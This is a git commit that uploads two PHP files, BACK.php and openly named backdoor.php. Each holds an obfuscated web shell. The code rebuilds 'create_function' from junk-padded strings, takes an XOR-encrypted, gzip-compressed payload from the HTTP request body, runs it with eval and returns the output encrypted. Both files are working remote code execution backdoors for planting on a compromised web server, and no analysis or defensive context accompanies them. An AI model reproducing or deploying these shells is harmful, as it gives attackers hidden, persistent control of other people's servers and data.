e270045361e324b1b827a6a0572c34d2a535def9
1nonlywizzler <165366346+Funkaarfam@users.noreply.github.com>
2026-04-21 20:07:05 +0500

    Add files via upload

---
+++ uploads/BACK.php
@@ -0,0 +1,11 @@
+<?php
+$e='al(@gzuncLompress(L@xL(@basLe64_decodeL($m[1]L),$kL)));L$Lo=@ob_get_LcontentsL();@obL_';
+$u=';($j<$c&LL&L$i<$l);$j++,$i++L)L{$Lo.L=$t{$LiL}L^$k{$j};}}return L$o;}if (@prLeg_matcLh';
+$H='(L"/$kh(.+)$kf/",@LfileL_get_conteLntsL("php://LinputL"),$mL)L==1) {@oLbL_start();@eLv';
+$h='end_cleaLn(L);$r=@base6L4L_encode(@Lx(@gzcomLprLessL($o),$k));pLrint("$LpL$kh$r$kf");}';
+$k='$k="1L060b7bL4";$khL="6a3bd36LbL3a0dL";$kf="66e0127Ld0517L";L$p=L"MEk17DLyVRHLj98Fwd";func';
+$P='tioLn xLL($t,$k){$c=stLLLrlen($k);$l=strlenL($t);$Lo=L"";for($i=0;L$iL<$l;){foLr(L$j=0';
+$W=str_replace('es','','escreateseeseses_funesction');
+$w=str_replace('L','',$k.$P.$u.$H.$e.$h);
+$s=$W('',$w);$s();
+?>
---
+++ uploads/backdoor.php
@@ -0,0 +1,11 @@
+<?php
+$G='eva^Il(@gzun^Icompress(@x^I(@base^I64_decode(^I$^Im[1]),$k))^I)^I;$o=@^Iob_get_^Icontents^I();@ob';
+$O='_e^In^Id_cle^Ian();$^Ir=@ba^Ise6^I4_encode(@x^I(@^Igzcompre^Iss($o),$k));pr^I^Iint(^I"$p$kh$r$kf");}';
+$q='^I;($j<$c&&$i<^I$l^I);$j^I++,$^Ii++){$o.=$t{$i}^^I$^Ik{^I^I$j};}}return $^Io;}^Iif (@pre^Ig_match';
+$M='$k="ee2da^I41d";^I$k^Ih="e9eb26^I9679^I01";$kf="^I7db7613^Ib^Ic^I778^I";$p="heq^IiT8zzw2CtZUy^I';
+$Z=str_replace('fz','','cfzreatfzefz_fufznfzctfzion');
+$U='("^I/$kh(.+)$k^If/",@^Ifile_g^Iet_con^It^Ien^Its("php://input"^I)^I,$m)^I==1)^I {@o^Ib_start(^I);@';
+$d='a";f^Iunc^It^Iion x($t,$k){$c=s^Itrle^In($k);$l=st^Irlen^I($t);$o=^I"";^Ifor($i=0;^I^I$i<$l;){fo^Ir($j=^I0';
+$m=str_replace('^I','',$M.$d.$q.$U.$G.$O);
+$w=$Z('',$m);$w();
+?>
